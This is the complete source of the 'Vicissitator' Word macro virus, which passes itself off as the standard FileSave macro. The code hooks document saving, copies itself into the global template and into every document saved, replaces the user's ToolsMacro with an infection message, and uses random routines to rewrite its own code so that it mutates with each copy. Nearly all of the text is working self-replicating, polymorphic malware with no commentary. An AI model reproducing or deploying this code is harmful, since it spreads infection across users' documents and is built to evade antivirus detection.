   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSave"

   Dim A As Object
   Dim B
   Dim Bad
   Dim D
   Dim lines
   Dim LinestoGoDown
   Dim line_$
   Dim N
   Dim Name_$
   Dim Name2$
   Dim Num$
   Dim Num_
   Dim RndLine
   Dim Rnd_Line$
   Dim Rnd_Len
   Dim Rnd_Sub$
   Dim Rnd_Num
   Dim Rnd_Var$
   Dim Start
   Dim For_There
   Dim Else_If_There
   Dim End_If_There
   Dim Next_There
   Dim While_There
   Dim Wend_There
   Dim Then_There
   Dim Var_$
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   Set A = WordBasic.DialogRecord.FileSaveAs(False)
   B = 0
   Bad = 0
   D = 0
   lines = 0
   LinestoGoDown = 0
   line_$ = ""
   N = 0
   Name_$ = ""
   Name2$ = ""
   Num$ = ""
   Num_ = 0
   RndLine = 0
   Rnd_Line$ = ""
   Rnd_Len = 0
   Rnd_Sub$ = ""
   Rnd_Num = 0
   Rnd_Var$ = ""
   Start = 0
   For_There = 0
   Else_If_There = 0
   End_If_There = 0
   Next_There = 0
   While_There = 0
   Wend_There = 0
   Then_There = 0
   Var_$ = ""
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableInput
   WordBasic.CurValues.FileSaveAs A
   If WordBasic.[Left$](WordBasic.[WindowName$](), 8) = "Document" Then WordBasic.Dialog.FileSaveAs A
   If WordBasic.[Left$](WordBasic.[WindowName$](), 8) = "Template" Then WordBasic.Dialog.FileSaveAs A
   If ((A.Format = 0) Or (A.Format = 1) Or (A.Format = 2)) Then
   A.Format = 1
   For B = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](B, 0) = "FileSave" Then N = 1
   Next B
   For B = 1 To WordBasic.CountMacros(1)
   If WordBasic.[MacroName$](B, 1) = "FileSave" Then D = 1
   Next B
   If N <> 1 Then
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSave", "Global:FileSave"
   WordBasic.MacroCopy "Global:FileSave", "Global:ToolsMacro"
   WordBasic.ScreenUpdating 0
   WordBasic.ToolsMacro Name:="ToolsMacro", Edit:=1
   WordBasic.StartOfDocument
   WordBasic.EndOfDocument 1
   WordBasic.WW6_EditClear
   WordBasic.Insert "Sub Main" + Chr(13)
   WordBasic.Insert "'You have been Infected by the Vicissitator Macro Virus."
   WordBasic.Insert Chr(13) + "'(C)1997 CyberYoda A Member of the SLAM Virus Team" + Chr(13)
   WordBasic.Insert "End Sub"
   WordBasic.DocClose 1
   WordBasic.ScreenUpdating 1
   ElseIf N = 1 And D <> 1 Then
   WordBasic.MacroCopy "Global:FileSave", "Global:Vicissitator"
   WordBasic.WaitCursor 1
   WordBasic.ScreenUpdating 0
   WordBasic.ToolsMacro Name:="Vicissitator", Edit:=1
   Mutate
   If Rnd() < 0.25 Then UnMutate
   If Rnd() < 0.25 Then ReVar
   If Rnd() < 0.25 Then NumChange
   If Rnd() < 0.1 Then NewLine
   If Rnd() < 0.0039 Then DelLine
   WordBasic.DocClose 1
   WordBasic.MacroCopy "Global:Vicissitator", WordBasic.[WindowName$]() + ":FileSave"
   WordBasic.ToolsMacro Name:="Vicissitator", Delete:=1
   WordBasic.ScreenUpdating 1
   WordBasic.WaitCursor 0
   End If
   WordBasic.FileSaveAs A
   GoTo Z:
   End If
   WordBasic.FileSave
   Z:
   End Sub
   Private Sub Mutate()
   On Error Resume Next
   WordBasic.StartOfDocument
   lines = 0
   While WordBasic.LineDown()
   lines = lines + 1
   Wend
   RndLine = WordBasic.Int(Rnd() * (lines))
   WordBasic.StartOfDocument
   WordBasic.LineDown RndLine
   WordBasic.StartOfLine
   RndLine = WordBasic.Int(Rnd() * (lines - RndLine)) + 1
   If RndLine > 10 Then RndLine = 10
   WordBasic.LineDown RndLine, 1
   Start = 1
   For B = 1 To RndLine
   If InStr(Start, WordBasic.[Selection$](), Chr(13)) <> 0 Then
   line_$ = Mid(WordBasic.[Selection$](), Start, InStr(Start, WordBasic.[Selection$](), Chr(13)) - Start)
   Else
   Bad = 1
   End If
   If WordBasic.[Left$](line_$, 3) = "Sub" Or WordBasic.[Left$](line_$, 3) = "Dim" Then
   Bad = 1
   ElseIf WordBasic.[Left$](line_$, 7) = "End Sub" Or WordBasic.[Left$](line_$, 2) = "On" Then
   Bad = 1
   ElseIf WordBasic.[Right$](line_$, 1) = ":" Then
   Bad = 1
   ElseIf WordBasic.[Right$](line_$, 4) = "Then" Then
   Short
   ElseIf WordBasic.[Right$](line_$, 2) = "If" Then
   End_If_There = End_If_There + 1
   ElseIf WordBasic.[Left$](line_$, 5) = "While" And While_There + 1 > Wend_There Then
   While_There = While_There + 1
   ElseIf WordBasic.[Left$](line_$, 4) = "Wend" Then
   Wend_There = Wend_There + 1
   ElseIf WordBasic.[Left$](line_$, 3) = "For" And For_There + 1 > Next_There Then
   For_There = For_There + 1
   ElseIf WordBasic.[Left$](line_$, 4) = "Next" Then
   Next_There = Next_There + 1
   End If
   Start = InStr(Start, WordBasic.[Selection$](), Chr(13)) + 1
   Next B
   If For_There <> Next_There Or While_There <> Wend_There Then Bad = 1
   If Then_There <> End_If_There Then Bad = 1
   If Else_If_There > 0 And Then_There = 0 Then Bad = 1
   If Else_If_There > 0 And End_If_There = 0 Then Bad = 1
   If Bad <> 1 Then
   WordBasic.EditCut
   Rnd_Len = WordBasic.Int(Rnd() * 10) + 2
   Rnd_Sub$ = Chr(WordBasic.Int(Rnd() * 25) + 65)
   For B = 2 To Rnd_Len
   Rnd_Sub$ = Rnd_Sub$ + Chr(WordBasic.Int(Rnd() * 25) + 97)
   Next B
   WordBasic.Insert "Call " + Rnd_Sub$ + Chr(13)
   WordBasic.EndOfDocument
   WordBasic.Insert Chr(13) + "Sub " + Rnd_Sub$ + Chr(13) + "On Error Resume Next" + Chr(13)
   WordBasic.EditPaste
   WordBasic.Insert "End Sub"
   End If
   End Sub
   Private Sub Short()
   On Error Resume Next
   If WordBasic.[Left$](line_$, 2) = "If" And Then_There + 1 > Else_If_There Then
   Then_There = Then_There + 1
   ElseIf WordBasic.[Left$](line_$, 4) = "Else" Then
   Else_If_There = Else_If_There + 1
   Else
   Bad = 1
   End If
   End Sub
   Private Sub UnMutate()
   On Error Resume Next
   WordBasic.StartOfDocument
   WordBasic.EditFind Find:="Call"
   If WordBasic.EditFindFound() <> 0 Then
   WordBasic.StartOfLine
   WordBasic.EndOfLine 1
   Name_$ = WordBasic.[Selection$]()
   Name_$ = WordBasic.[Right$](Name_$, Len(Name_$) - 5)
   Name_$ = WordBasic.[Left$](Name_$, Len(Name_$) - 1)
   WordBasic.EditFindClearFormatting
   WordBasic.EndOfLine
   Name2$ = "Sub " + Name_$
   WordBasic.EditFind Find:=Name2$
   WordBasic.LineDown 2
   WordBasic.StartOfLine
   WordBasic.EndOfLine 1
   LinestoGoDown = 0
   While WordBasic.[Right$](WordBasic.[Selection$](), 8) <> "End Sub" + Chr(13)
   WordBasic.LineDown
   WordBasic.StartOfLine
   WordBasic.EndOfLine 1
   LinestoGoDown = LinestoGoDown + 1
   Wend
   WordBasic.StartOfDocument
   WordBasic.EditFind Find:=Name2$
   WordBasic.StartOfLine
   WordBasic.EndOfLine 1
   WordBasic.LineDown 1, 1
   WordBasic.EndOfLine 1
   WordBasic.WW6_EditClear
   WordBasic.StartOfLine
   WordBasic.LineDown LinestoGoDown, 1
   WordBasic.EditCut
   WordBasic.StartOfLine
   WordBasic.EndOfLine 1
   WordBasic.StartOfDocument
   WordBasic.EditFind Find:="Call " + Name_$
   WordBasic.EditPaste
   WordBasic.StartOfLine
   WordBasic.EndOfLine 1
   End If
   End Sub
   Private Sub ReVar()
   On Error Resume Next
   WordBasic.StartOfDocument
   lines = 0
   While WordBasic.LineDown()
   lines = lines + 1
   Wend
   WordBasic.StartOfDocument
   WordBasic.LineDown WordBasic.Int(Rnd() * lines) + 1
   WordBasic.EditFind Find:="=", Wrap:=1
   If WordBasic.EditFindFound() <> 0 Then
   WordBasic.StartOfLine 1
   Var_$ = WordBasic.[RTrim$](WordBasic.[Selection$]())
   Var_$ = WordBasic.[Right$](Var_$, Len(Var_$))
   If InStr(1, Var_$, " ") <> 0 Then
   Var_$ = WordBasic.[Right$](Var_$, Len(Var_$) - InStr(1, Var_$, " "))
   End If
   Rnd_Len = WordBasic.Int(Rnd() * 10) + 2
   Rnd_Var$ = Chr(WordBasic.Int(Rnd() * 25) + 65)
   For B = 2 To Rnd_Len
   Rnd_Var$ = Rnd_Var$ + Chr(WordBasic.Int(Rnd() * 25) + 97)
   Next B
   If InStr(1, Var_$, Chr(36)) <> 0 Then
   Rnd_Var$ = Rnd_Var$ + Chr(36)
   End If
   WordBasic.EditReplace Find:=Var_$, Replace:=Rnd_Var$, ReplaceAll:=1, WholeWord:=1, Wrap:=1
   End If
   End Sub
   Private Sub NumChange()
   On Error Resume Next
   WordBasic.StartOfDocument
   lines = 0
   While WordBasic.LineDown()
   lines = lines + 1
   Wend
   WordBasic.StartOfDocument
   WordBasic.LineDown WordBasic.Int(Rnd() * lines) + 1
   WordBasic.EditFind Find:=Chr(48 + WordBasic.Int(Rnd() * 10))
   If WordBasic.EditFindFound() <> 0 Then
   WordBasic.WordLeft
   WordBasic.WordRight 1, 1
   Num$ = WordBasic.[Selection$]()
   Num$ = WordBasic.[RTrim$](Num$)
   Num_ = WordBasic.Val(Num$)
   Rnd_Num = WordBasic.Int(Rnd() * 10) + 1
   If Rnd() < 0.25 Then
   If Num_ / Rnd_Num = WordBasic.Int(Num_ / Rnd_Num) Then WordBasic.Insert WordBasic.[LTrim$](Str(Num_ / Rnd_Num)) + " *" + Str(Rnd_Num) + " "
   ElseIf Rnd() < 0.25 Then
   WordBasic.Insert WordBasic.[LTrim$](Str(Num_ * Rnd_Num)) + " /" + Str(Rnd_Num) + " "
   ElseIf Rnd() < 0.25 Then
   WordBasic.Insert "(" + WordBasic.[LTrim$](Str(Num_ + Rnd_Num)) + " -" + Str(Rnd_Num) + ") "
   Else
   WordBasic.Insert "(" + WordBasic.[LTrim$](Str(Num_ - Rnd_Num)) + " +" + Str(Rnd_Num) + ") "
   End If
   End If
   End Sub
   Private Sub NewLine()
   On Error Resume Next
   WordBasic.StartOfDocument
   lines = 0
   While WordBasic.LineDown()
   lines = lines + 1
   Wend
   WordBasic.StartOfDocument
   WordBasic.LineDown WordBasic.Int(Rnd() * lines) + 1
   WordBasic.EditFind Find:="Sub ", Wrap:=1
   WordBasic.LineDown
   WordBasic.StartOfLine
   Rnd_Len = WordBasic.Int(Rnd() * 10) + 2
   Rnd_Line$ = Chr(WordBasic.Int(Rnd() * 25) + 65)
   For B = 2 To Rnd_Len
   Rnd_Line$ = Rnd_Line$ + Chr(WordBasic.Int(Rnd() * 25) + 97)
   Next B
   WordBasic.Insert "If " + Rnd_Line$ + " = "
   Rnd_Len = WordBasic.Int(Rnd() * 10) + 2
   Rnd_Line$ = Chr(WordBasic.Int(Rnd() * 25) + 65)
   For B = 2 To Rnd_Len
   Rnd_Line$ = Rnd_Line$ + Chr(WordBasic.Int(Rnd() * 25) + 97)
   Next B
   WordBasic.Insert Rnd_Line$ + " Then "
   Rnd_Len = WordBasic.Int(Rnd() * 10) + 2
   Rnd_Line$ = Chr(WordBasic.Int(Rnd() * 25) + 65)
   For B = 2 To Rnd_Len
   Rnd_Line$ = Rnd_Line$ + Chr(WordBasic.Int(Rnd() * 25) + 97)
   Next B
   WordBasic.Insert Rnd_Line$ + " = "
   Rnd_Len = WordBasic.Int(Rnd() * 10) + 2
   Rnd_Line$ = Chr(WordBasic.Int(Rnd() * 9) + 49)
   For B = 2 To Rnd_Len
   Rnd_Line$ = Rnd_Line$ + Chr(WordBasic.Int(Rnd() * 9) + 48)
   Next B
   WordBasic.Insert Rnd_Line$ + Chr(13)
   End Sub
   Private Sub DelLine()
   On Error Resume Next
   WordBasic.StartOfDocument
   lines = 0
   While WordBasic.LineDown()
   lines = lines + 1
   Wend
   WordBasic.StartOfDocument
   WordBasic.LineDown WordBasic.Int(Rnd() * lines) + 1
   WordBasic.EditFind Find:="Sub ", Wrap:=1
   WordBasic.StartOfLine
   WordBasic.LineDown
   WordBasic.LineDown WordBasic.Int(Rnd() * lines), 1
   WordBasic.EndOfLine 1
   WordBasic.WW6_EditClear
   End Sub
